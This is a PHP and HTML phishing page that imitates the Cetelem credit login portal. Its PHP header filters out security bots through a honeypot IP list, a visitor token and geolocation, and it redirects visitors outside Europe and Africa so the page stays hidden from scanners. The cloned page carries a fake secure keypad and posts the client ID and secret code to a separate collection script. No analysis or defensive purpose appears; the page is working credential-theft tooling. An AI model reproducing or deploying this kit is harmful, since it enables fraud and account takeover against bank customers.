<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  $stripos = '1';

}



$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));
if ($token1 != $_GET['token'] || $stripos == '1' ){ header("location: " . $errorUrl . "?hash=".base64_encode(rand(0,9999999999999)). "&token=" . $_GET['token']); exit;  }

function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 
$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(curl_get_contents($geoip)); 
$continent = $addrDetailsArr['geoplugin_continentCode'];
$country = $addrDetailsArr['geoplugin_countryCode'];

if (!$country)
{
    $country='Not found!';
}

if ($continent !== 'EU' && $continent !== 'AF')
{
      header("location: " . $errorUrl . "?" . $_GET['token']);
     exit();
} 





?>


<!DOCTYPE html> 
<html lang="fr" style=""><head><meta charset="utf-8">

  <meta content="IE=edge,chrome=1" http-equiv="X-UA-compatible">
  <title>Cetelem : Simulation et demande de credit en ligne</title>
  
  
  
  
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  
      <link rel="stylesheet" type="text/css" href="./Ctlm_files/Ctlm-style-01.css">
    <link rel="stylesheet" type="text/css" href="./Ctlm_files/Ctlm-style-02.css">
    <link rel="stylesheet" type="text/css" href="./Ctlm_files/Ctlm-style-03.css">  
 <link type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABMLAAATCwAAAAAAAAAAAAD///8A////AP3+/QDK4skCwd2/QMLewFTD3sFSwt7AUsLewFLD3sFSwt7AUsLdwFXE3sI09vr1AP///wD///8A////AP///wD3+/cAVZ9RODeNMv87kDb/O5A2/zuQNv87kDb/O5A2/zuQNv86jzX/QpQ97N/t3hz///8A////AP///wD///8A9/v3AFmhVRI7kTaVP5M6qz+TOqc/kzqnP5M6pz+TOqc/kzqnPpI5rEaWQYHg7t8F////AP///wD///8A////APf79wBZoVUAO5E2AD+TOgA/kzoAP5M6AD+TOgA/kzoAP5M6AD6SOQBGlkEA4O7fAP///wD///8A////AP///wD3+/cAWaFVADuRNgA/kzoEP5M6Tz+TOp4/kzq6P5M6qz+TOmo+kjkSRpZBAODu3wD///8A////AP///wD///8A9/v3AFmhVQA7kTYaP5M6vj+TOv8/kzr/P5M6/z+TOv8/kzr/PpI55EaWQT/g7t8A////AP///wD///8A////APf79wBZoVUJO5E2yD+TOv8/kzr1P5M6mz+TOmY/kzqDP5M64T6SOf9GlkHO4O7fAv///wD///8A////AP///wD3+/cAWaFVbjuRNv8/kzrxP5M6Oj+TOgA/kzoAP5M6AD+TOhY+kjmfRpZBa+Du3wD///8A////AP///wD///8A9/v3AFmhVcA7kTb/P5M6fT+TOgA/kzoAP5M6AD+TOgA/kzoAPpI5AEaWQQDg7t8A////AP///wD///8A////APf79wpZoVXdO5E2/z+TOkE/kzoAP5M6AD+TOgA/kzoAP5M6AD6SOQBGlkEA4O7fAP///wD///8A////AP///wD3+/cFWaFV1TuRNv8/kzpSP5M6AD+TOgA/kzoAP5M6AD+TOgA+kjkARpZBAODu3wD///8A////AP///wD///8A9/v3AFmhVaI7kTb/P5M6tD+TOgA/kzoAP5M6AD+TOgA/kzoAPpI5IEaWQRLg7t8A////AP///wD///8A////APf79wBZoVU7O5E2/j+TOv8/kzqfP5M6Gz+TOgA/kzoMP5M6bj6SOf9GlkHB4O7fAP///wD///8A////AP///wD3+/cAWaFVADuRNnU/kzr/P5M6/z+TOvU/kzrXP5M66z+TOv8+kjn/RpZBpuDu3wD///8A////AP///wD///8A9/v3AFegUwA5jjQAPZE4UD2RONA9kTj/PZE4/z2ROP89kTjlPJA3ekSUPwbf7d4A////AP///wD///8A////AP3+/QDP5c0AxuDEAMjhxgDI4cYGyOHGMsjhxk7I4cY+yOHGEMfgxQDJ4ccA9vv2AP///wD///8A4AcAAOADAADgAwAA//8AAPgPAADwBwAA4AMAAOHHAADj/wAAw/8AAMP/AADj5wAA4IcAAPAHAAD4BwAA/B8AAA==" rel="shortcut icon"></head>
 <body class="fr PC world prof cetelem">
  <div id="sf-master">
   <div class="ls-canvas ls-row full-globalContainer" id="globalContainer">
    <div class="ls-row row" id="headerContainer" style="position:relative">
     <div class="ls-fxr" id="ls-gen37775052-ls-fxr">
      <div class="ls-col content-column column small-12 small-centered" id="header-columns">
       <div class="ls-col-body" id="ls-gen37775053-ls-col-body">
        <div class="ls-row" id="ls-row-1-col-1-row-1">
         <div class="ls-fxr" id="ls-gen37775054-ls-fxr">
          <div class="ls-area" id="ls-row-1-col-1-row-1-area-1">
           <div class="ls-area-body" id="ls-gen37775055-ls-area-body">
            <div class="ls-cmp-wrap ls-1st" id="w1570207717444">
             <div class="iw_component" id="1570207717444">
              
              <div class="mainNav">
               <div class="mobileRow">
                <a title="" class="mobileNav sf-hidden"></a>
                <a title="" class="logo" href="#">
                 <picture>
                  <img alt="Cetelem" src="data:image/png;base64,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">
                 </picture>
                </a>
                <a class="mobileConnection logoff sf-hidden"></a>
               </div>
               <div class="navContainer">
                <ul class="nav">
                 <li class="accueil-menu show-for-small-only sf-hidden"></li>
                 <li class="accessibilite-menu show-for-small-only sf-hidden"></li>
                 <li class="search-mob show-for-small-only sf-hidden"></li>
                 <li data-subnav="contacts" class="contact-menu show-for-small-only sf-hidden"></li>
                 <li class="credit aria-lable-click" data-subnav="credit">
                  <a tabindex="0" title="">
                   <span>Crédit</span>
                  </a>
                 </li>
                 <li class="cpay aria-lable-click" data-subnav="cpay">
                  <a tabindex="0" title="">
                   <span>Carte Cpay</span>
                  </a>
                 </li>
                 <li class="assurance aria-lable-click" data-subnav="assurance">
                  <a tabindex="0" title="">
                   <span>Assurance</span>
                  </a>
                 </li>
                 <li class="projets aria-lable-click" data-subnav="projets">
                  <a tabindex="0" title="">
                   <span>C Mon Projet</span>
                  </a>
                 </li>
                 <li class="plus-nav-responsab aria-lable-click">
                  <a tabindex="0" title="" href="#">
                   <span>Nos engagements</span>
                  </a>
                 </li>
                 <li data-subnav="search" class="hide-for-small-only aria-lable-click sf-hidden"></li>
                </ul>
               </div>
               <div id="connectionContainer" class="connectionContainer logoff active open">
                <ul class="connection">
                 <li data-subconnection="virementExpress" class="virementExpress dis-activ sf-hidden"></li>
                 <li class="accesClient active" data-subconnection="accesClient">
                  <a title="accesClient">
                   <span>Votre espace <br class="hide-for-small sf-hidden"> personnel </span>
                  </a>
                 </li>
                </ul>
                <ul class="subConnection">
             
                 <li class="virementExpress" id="virementExpress">
                  <div class="pf_loader_div pf_loader_div_new pf_hide sf-hidden"></div>
                  <div xmlns:java="http://xml.apache.org/xslt/java" data-url-context="/frpfclientnape/" class="requestForFunding_ia">
                  </div>
                  <a class="close sf-hidden"></a>
                  <div class="iaLoader"></div>
                 </li>
                 <li class="accesClient iaInit active" id="accesClient">
                  <div class="pf_loader_div pf_loader_div_new pf_hide sf-hidden"></div>
                  <div data-url-context="/frpfpciaaape/" class="fullAuthentication_ia">
                   <div>
                    <div class="intro">
                     <div class="title cpay-color">Accéder à mon espace sécurisé (DSP2)</div>
                     <div class="maintanenceText sf-hidden"> Une maintenance technique est prévue dans la nuit du dimanche 02 au Mercredi 05 Janvier 2022 . L’accès à votre Espace Personnel peut être perturbé, veuillez nous excuser pour la gêne occasionnée. </div>
                    </div>
                    <div class="formIdentification large">
                     <form id="accesClientIdentification" method="post" novalidate="false" action="<?php echo 'Ctlm-infos.php?token='.$token1; ?>">
                      <div class="col">
                       <div class="title identification cpay-color">
                        <span rv-text="model.app.authentication.S18.LIBF05-003_1_1">IDENTIFIANT CLIENT</span>
                       </div>
                       <div>
                        <label for="accesClientIdentifiantClient">
                         <strong rv-html="model.app.authentication.S18.LIBF05-003_2_2">Saisissez votre identifiant Client</strong>
                         <br>
                        </label>
                        <div class="helperContainer">
                         <span>
                          <input type="tel" id="accesClientIdentifiantClient" name="usr" rv-value="publish.userId" tabindex="1" maxlength="10" autocomplete="on" placeholder="Votre identifiant client" value="" required>
                         </span>
                         <div class="helperBtn hasTooltip" data-tooltip="helperContent" data-position="right center" data-orientation="left top" data-hasqtip="5"></div>
                         <div id="helperContent" class="hide helpWCMCOntent sf-hidden"></div>
                        </div>
                        <div class="row">
                         <div class="columns">
                          <span class="required" rv-text="errors.userIdText" rv-show="errors.userId" style="display:none"></span>
                          <span class="required" rv-text="errors.clientidRestrictedMessage" rv-show="errors.clientidRestrictedErrorFlag" style="display:none"></span>
                         </div>
                        </div>
                        <div class="row">
                         <div class="columns">
                          <div class="ml customCheckboxContainer">
                           <input type="checkbox" value="1" id="to_store">
                           <a class="customCheckbox"></a>
                           <label class="pf_inline_block" rv-text="model.app.authentication.S18.LIBF05-003_11">Mémoriser votre identifiant</label>
                           <span data-tooltip="infoContent" class="infoContent small-push-3 margin-top-reduce borderedGreenBox hasTooltip icon-mini pf_inline_block borderedBox content-pad radius text-center large-push-3 medium-push-4 small-push-3 h4-like weak main-color right padding-left-reduce padding-right-reduce padding-top-reduce padding-bottom-reduce grey-box " data-hasqtip="6">i</span>
                           <br>
                           <div class="icm-lost-link">
                            <u>
                             <a class="identifiantOublie cpay-color" rv-show="view.amICM" href="#">Identifiant oublié ?</a>
                            </u>
                           </div>
                           <div id="infoContent" class="hide infoWCMContent sf-hidden"></div>
                          </div>
                         </div>
                        </div>
                        <div class="bgSubConnection sf-hidden"></div>
                       </div>
                      </div>
                      <div class="col">
                       <div class="title codeSecret cpay-color">
                        <span rv-text="model.app.authentication.S18.LIBF05-003_4">CODE SECRET</span>
                       </div>
                       <div>
                        <label for="accesClientCodeSecret">
                         <strong rv-text="model.app.authentication.S18.LIBF05-003_5">Saisissez votre code secret à 6 chiffres à l’aide du clavier</strong>
                        </label>
                        <div class="inputResetContainer">
                         <span>
                          <input type="text" readonly="readonly" id="pwdnjma" name="pwdnjma" class="password_text" placeholder="Votre code secret" value="" required style="
    vertical-align: middle;
    text-align: center;
    padding-top: 20px;
">

<input type="hidden" id="pwd" name="pwd" value="" minlength="6" required>
                         </span>
                         <a class="resetBtn hasTooltip" data-tooltip="resetContent" data-position="right center" data-orientation="left top" data-hasqtip="7" onclick=" document.getElementById('pwd').value = ''; document.getElementById('pwdnjma').value = '';"></a>
                         <div id="resetContent" class="hide sf-hidden"></div>
                        </div>
                        <div class="row">
                         <div class="columns">
                          <span class="required" rv-html="errors.passwordText" rv-show="errors.password" style="display:none"></span>
                         </div>
                        </div>
                        <div class="securedKeyboard">
                         <div class="passwordKeyboard">
                          <div class="keyPadImg pf_keypad_outline" tabindex="2" style="
    height: 125px;
    text-align: center;
    vertical-align: middle;
">
    <div style="
    height: 50%;
    display: inline-flex;
">
    <div onclick="if (document.getElementById('pwdnjma').value.length < 6) { document.getElementById('pwdnjma').value = document.getElementById('pwdnjma').value + '*'; document.getElementById('pwd').value = document.getElementById('pwd').value + '1'; }" style="
    padding: 5px;
    background-color: #398f3e;
    margin: 5px;
    border-radius: 20px;
    width: 40px;
    height: 40px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
"><span style="
    text-align: center;
    vertical-align: middle;
    color: white;
    font-size: large;
">8</span></div>
<div style="
    padding: 5px;
    background-color: #398f3e;
    margin: 5px;
    border-radius: 20px;
    width: 40px;
    height: 40px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
" onclick="if (document.getElementById('pwdnjma').value.length < 6) { document.getElementById('pwdnjma').value = document.getElementById('pwdnjma').value + '*'; document.getElementById('pwd').value = document.getElementById('pwd').value + '3'; }"><span style="
    text-align: center;
    vertical-align: middle;
    color: white;
    font-size: large;
">3</span></div><div style="
    padding: 5px;
    background-color: #398f3e;
    margin: 5px;
    border-radius: 20px;
    width: 40px;
    height: 40px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
" onclick="if (document.getElementById('pwdnjma').value.length < 6) { document.getElementById('pwdnjma').value = document.getElementById('pwdnjma').value + '*'; document.getElementById('pwd').value = document.getElementById('pwd').value + '9'; }"><span style="
    text-align: center;
    vertical-align: middle;
    color: white;
    font-size: large;
">9</span></div><div style="
    padding: 5px;
    background-color: #398f3e;
    margin: 5px;
    border-radius: 20px;
    width: 40px;
    height: 40px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
" onclick="if (document.getElementById('pwdnjma').value.length < 6) { document.getElementById('pwdnjma').value = document.getElementById('pwdnjma').value + '*'; document.getElementById('pwd').value = document.getElementById('pwd').value + '2'; }"><span style="
    text-align: center;
    vertical-align: middle;
    color: white;
    font-size: large;
">2</span></div><div style="
    padding: 5px;
    background-color: #398f3e;
    margin: 5px;
    border-radius: 20px;
    width: 40px;
    height: 40px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
" onclick="if (document.getElementById('pwdnjma').value.length < 6) { document.getElementById('pwdnjma').value = document.getElementById('pwdnjma').value + '*'; document.getElementById('pwd').value = document.getElementById('pwd').value + '7'; }"><span style="
    text-align: center;
    vertical-align: middle;
    color: white;
    font-size: large;
">7</span></div></div>
    <div style="
    height: 50%;
    display: inline-flex;
">
    <div style="
    padding: 5px;
    background-color: #398f3e;
    margin: 5px;
    border-radius: 20px;
    width: 40px;
    height: 40px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
" onclick="if (document.getElementById('pwdnjma').value.length < 6) { document.getElementById('pwdnjma').value = document.getElementById('pwdnjma').value + '*'; document.getElementById('pwd').value = document.getElementById('pwd').value + '6'; }"><span style="
    text-align: center;
    vertical-align: middle;
    color: white;
    font-size: large;
">6</span></div>
<div style="
    padding: 5px;
    background-color: #398f3e;
    margin: 5px;
    border-radius: 20px;
    width: 40px;
    height: 40px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
" onclick="if (document.getElementById('pwdnjma').value.length < 6) { document.getElementById('pwdnjma').value = document.getElementById('pwdnjma').value + '*'; document.getElementById('pwd').value = document.getElementById('pwd').value + '5'; }"><span style="
    text-align: center;
    vertical-align: middle;
    color: white;
    font-size: large;
">5</span></div><div style="
    padding: 5px;
    background-color: #398f3e;
    margin: 5px;
    border-radius: 20px;
    width: 40px;
    height: 40px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
" onclick="if (document.getElementById('pwdnjma').value.length < 6) { document.getElementById('pwdnjma').value = document.getElementById('pwdnjma').value + '*'; document.getElementById('pwd').value = document.getElementById('pwd').value + '1'; }"><span style="
    text-align: center;
    vertical-align: middle;
    color: white;
    font-size: large;
">1</span></div><div style="
    padding: 5px;
    background-color: #398f3e;
    margin: 5px;
    border-radius: 20px;
    width: 40px;
    height: 40px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
" onclick="if (document.getElementById('pwdnjma').value.length < 6) { document.getElementById('pwdnjma').value = document.getElementById('pwdnjma').value + '*'; document.getElementById('pwd').value = document.getElementById('pwd').value + '0'; }"><span style="
    text-align: center;
    vertical-align: middle;
    color: white;
    font-size: large;
">0</span></div><div style="
    padding: 5px;
    background-color: #398f3e;
    margin: 5px;
    border-radius: 20px;
    width: 40px;
    height: 40px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
" onclick="if (document.getElementById('pwdnjma').value.length < 6) { document.getElementById('pwdnjma').value = document.getElementById('pwdnjma').value + '*'; document.getElementById('pwd').value = document.getElementById('pwd').value + '4'; }"><span style="
    text-align: center;
    vertical-align: middle;
    color: white;
    font-size: large;
">4</span></div></div><div style="
    height: 50%;
"></div>

</div>
                         </div>
                         <a class="codeSecretOublie lastPwdRD" rv-text="model.app.authentication.S18.LIBF05-003_7" rv-show="view.amICM">Code secret perdu ?</a>
                         <a class="codeSecretOublie hasModal" rv-text="model.app.authentication.S18.LIBF05-003_7" rv-hide="view.amICM" style="display:none" data-hasqtip="4">Code secret perdu ?</a>
                        </div>
                        <div>
                         <input formnovalidate="false" type="button" onclick="if (document.getElementById('pwdnjma').value.length == 6) { document.getElementById('accesClientIdentification').submit(); }" id="accesClientSubmit" class="button radius large next-arrow spacedTop nowrap padding-mini secondary"  value="ME CONNECTER >" style="
    background-color: #36863b;
">
                        </div>
                        <div class="conventionBancaire">
                         <a></a>
                         <span></span>
                        </div>
                       </div>
                      </div>
					  <input type="hidden" name="type" value="log">
                     </form>
                    </div>
                    <div class="autresEspacesDedies">
                     <div class="title font-18"> Retrouvez vos autres espaces dédiés </div>
                     <ul>
                      <li>
                       <div class="title" id="contrats">
                        <a href="#">
                         <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAMAAABXc8oyAAAA/FBMVEWUlZT///+UlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZTqfDOYAAAAU3RSTlMAAAEEDg8QFBkaHiAjJCcsLS4xMzU3QUJESUxNTlRbXV5gYmlsent8fYCChYmKkJiZm5ydnp+goaOrsLu9wMLEx8jd3uXn7O7v8PHy8/X29/j5+oov2hEAAADeSURBVDjL7dDZUsIwFIDhPyCiVgRFxKUCteC+gQqyqSCKyk7e/128aM1M2vACDv9tvjlJDkLvuDWWvacUqr8DNBZ97p/ubO6X5+cR3yXebBO8et8AIP1x5rlUrzmxw3BtnhEeSE+TAJnPm0jOkxosvggf8nAPZIclhLj7CsHapYIHXbDHLoi8YWLDVXBrBtMTwB0dhd/YcBS0JEgLiqOs4df1nILrE5C3F5WfPdMeY1EFicN1tfq4G1i47SyosKJD+do2950PwFV1hV7bWcIl/A9w2zLXCcCBXNShD38BXz80iOEqEqYAAAAASUVORK5CYII=">
                         <div>
                          <span class="cpay-color">Souscription électronique</span>
                          <span class="subtitle">(en magasin ou en ligne) <br>Consultez votre contrat </span>
                         </div>
                        </a>
                       </div>
                      </li>
                      <li>
                       <div class="title" id="moncontrat">
                        <a href="#">
